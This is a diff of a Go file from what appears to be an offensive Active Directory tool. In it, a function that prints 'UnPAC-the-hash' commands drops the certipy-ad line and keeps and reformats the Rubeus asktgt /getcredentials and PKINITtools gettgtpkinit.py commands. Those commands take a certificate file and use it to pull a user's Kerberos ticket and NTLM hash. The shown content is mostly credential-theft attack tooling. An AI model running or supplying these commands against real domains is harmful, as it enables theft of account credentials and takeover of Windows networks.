@@ -378,7 +378,7 @@ func encodeUTF16LE(s string) []byte {
 
 // PrintUnPACGuidance prints external-tool commands for UnPAC-the-hash.
 // Use UnPACTheHash() for real built-in extraction; this prints commands for
-// certipy-ad, Rubeus, and PKINITtools as a reference.
+// Rubeus and PKINITtools as a reference.
 func PrintUnPACGuidance(pfxPath, pfxPass, dc, domain, upn string) {
 	user := upn
 	if idx := strings.Index(user, "@"); idx > 0 {
@@ -387,17 +387,11 @@ func PrintUnPACGuidance(pfxPath, pfxPass, dc, domain, upn string) {
 
 	fmt.Println("[*] UnPAC-the-Hash commands (external tools):")
 
-	fmt.Println("    # certipy-ad (performs PKINIT + UnPAC in one step)")
-	fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n", pfxPath, domain)
-	fmt.Println("    # Look for 'Got hash' in output")
-
-	fmt.Println("    # Rubeus (Windows — requests TGT + extracts credentials)")
 	rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /getcredentials /show /nowrap", user, pfxPath)
 	if pfxPass != "" {
 		rubeusCmd += fmt.Sprintf(" /password:%s", pfxPass)
 	}
-	fmt.Printf("    %s\n", rubeusCmd)
-	fmt.Println("    # Look for 'NTLM' hash in credential info")
+	fmt.Printf("    # Rubeus (Windows — extracts NTLM hash via TGT)\n    %s\n", rubeusCmd)
 
 	fmt.Println("    # PKINITtools (Python)")
 	fmt.Printf("    python gettgtpkinit.py %s/%s %s.ccache -cert-pfx %s -pfx-pass '%s'\n", domain, user, user, pfxPath, pfxPass)
